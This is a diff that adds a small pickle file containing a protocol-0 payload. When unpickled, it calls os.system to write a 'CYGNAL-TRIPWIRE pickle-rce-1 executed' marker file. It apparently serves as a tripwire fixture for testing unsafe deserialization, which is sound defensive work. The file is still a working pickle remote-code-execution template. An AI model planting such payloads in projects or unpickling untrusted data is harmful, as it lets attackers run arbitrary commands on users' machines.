@@ -1,0 +1,8 @@
+cos
+system
+p0
+(Vecho "CYGNAL-TRIPWIRE pickle-rce-1 executed" > cygnal_pickle_rce_marker.txt
+p1
+tp2
+Rp3
+.
